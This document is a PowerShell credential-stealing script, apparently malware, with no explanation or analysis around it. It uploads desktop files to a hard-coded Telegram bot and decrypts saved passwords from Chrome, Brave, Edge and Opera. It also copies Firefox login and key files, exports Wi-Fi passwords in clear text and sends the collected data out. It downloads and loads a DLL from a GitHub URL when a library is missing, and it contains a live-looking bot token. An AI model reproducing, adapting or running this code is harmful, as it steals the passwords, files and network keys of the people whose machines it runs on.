[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $pcName = $env:COMPUTERNAME
 $desktopPath = [Environment]::GetFolderPath('Desktop')
 $botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
 $chatId = "8221773638"
 $stateFile = "$env:TEMP\dx_state.dat"
 $tempZip = "$env:TEMP\wifiprof.zip"
 $tempXml = "$env:TEMP\wifiprof.xml"
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

function Decrypt-DPAPI {
    param([byte[]]$Data)
    try {
        return [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, 'CurrentUser')
    } catch { return $null }
}

function Send-TG {
    param([string]$Caption, [string]$FilePath)
    if (-not (Test-Path $FilePath) -or (Get-Item $FilePath).Length -eq 0) { return }
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileName = [System.IO.Path]::GetFileName($FilePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
    $body = "--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n--$boundary`r`nContent-Disposition: form-data; name=`"caption`"`r`n`r`n$Caption`r`n--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n$fileEnc`r`n--$boundary--`r`n"
    $webRequest = [System.Net.HttpWebRequest]::Create("https://api.telegram.org/bot$botToken/sendDocument")
    $webRequest.Method = "POST"
    $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
    $webRequest.UserAgent = "Mozilla/5.0"
    $webRequest.Timeout = 120000
    try {
        $reqStream = $webRequest.GetRequestStream()
        $reqBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $reqStream.Write($reqBytes, 0, $reqBytes.Length)
        $reqStream.Close()
        $webRequest.GetResponse().Close()
    } catch {}
}

if (-not (Test-Path $stateFile)) { @{} | Export-Clixml -Path $stateFile -Force }
 $state = Import-Clixml -Path $stateFile

Get-ChildItem -Path $desktopPath -File | ForEach-Object {
    $item = $_
    $hash = (Get-FileHash -Path $item.FullName -Algorithm SHA256).Hash
    if (-not $state.ContainsKey($hash)) {
        Send-TG -Caption "$($item.Name) [$pcName]" -FilePath $item.FullName
        $state[$hash] = $true
        $state | Export-Clixml -Path $stateFile -Force
    }
}

 $finalLog = "$env:TEMP\browser_data.log"
"" | Out-File $finalLog -Encoding UTF8

 $chromiumBrowsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
}

foreach ($b in $chromiumBrowsers.Keys) {
    $path = $chromiumBrowsers[$b]
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Directory | ForEach-Object {
            $profilePath = $_.FullName
            $loginDb = Join-Path $profilePath "Login Data"
            if (Test-Path $loginDb) {
                $tempDb = "$env:TEMP\ld_$($b).db"
                Copy-Item $loginDb $tempDb -Force
                try {
                    Add-Type -Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.dll" -ErrorAction SilentlyContinue
                    $conn = New-Object System.Data.SQLite.SQLiteConnection
                } catch {
                    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("User-Agent","Mozilla/5.0")
                    $webClient.DownloadFile("https://raw.githubusercontent.com/ghost-mvt/XUZ/main/System.Data.SQLite.dll", $sqliteDll)
                    Add-Type -Path $sqliteDll
                    $conn = New-Object System.Data.SQLite.SQLiteConnection
                }
                try {
                    $conn.ConnectionString = "Data Source=$tempDb;Version=3;New=False;Compress=True;"
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins"
                    $reader = $cmd.ExecuteReader()
                    while ($reader.Read()) {
                        $url = if ($reader.IsDBNull(0)) { "" } else { $reader.GetString(0) }
                        $user = if ($reader.IsDBNull(1)) { "" } else { $reader.GetString(1) }
                        if (-not $reader.IsDBNull(2)) {
                            $encPass = $reader.GetBytes(2, 0, $null, 0, 0)
                            $passBytes = New-Object byte[] $encPass
                            $reader.GetBytes(2, 0, $passBytes, 0, $encPass)
                            $decPass = Decrypt-DPAPI -Data $passBytes
                            $pass = if ($decPass) { [System.Text.Encoding]::UTF8.GetString($decPass) } else { "[DECRYPT_FAILED]" }
                        } else { $pass = "" }
                        if ($user -or $pass -ne "[DECRYPT_FAILED]") {
                            "[$b] URL: $url | User: $user | Pass: $pass" | Out-File $finalLog -Encoding UTF8 -Append
                        }
                    }
                    $reader.Close()
                    $conn.Close()
                } catch {}
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

 $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfiles) {
    Get-ChildItem -Path $firefoxProfiles -Directory | ForEach-Object {
        $profilePath = $_.FullName
        $loginsJson = Join-Path $profilePath "logins.json"
        $key4Db = Join-Path $profilePath "key4.db"
        if ((Test-Path $loginsJson) -and (Test-Path $key4Db)) {
            "[Firefox] Raw logins.json exported for offline decryption." | Out-File $finalLog -Encoding UTF8 -Append
            Copy-Item $loginsJson "$env:TEMP\ff_logins.json" -Force
            Copy-Item $key4Db "$env:TEMP\ff_key4.db" -Force
        }
    }
}

if ((Get-Item $finalLog).Length -gt 0) {
    Send-TG -Caption "Decrypted Browser Data [$pcName]" -FilePath $finalLog
}
Remove-Item $finalLog -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\ff_logins.json" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\ff_key4.db" -Force -ErrorAction SilentlyContinue

try {
    netsh wlan export profile key=clear folder=$env:TEMP | Out-Null
    if (Test-Path $tempXml) {
        Compress-Archive -Path $tempXml -DestinationPath $tempZip -Force
        Send-TG -Caption "Wi-Fi Passwords [$pcName]" -FilePath $tempZip
    }
} catch {}
Remove-Item $tempXml -Force -ErrorAction SilentlyContinue
Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
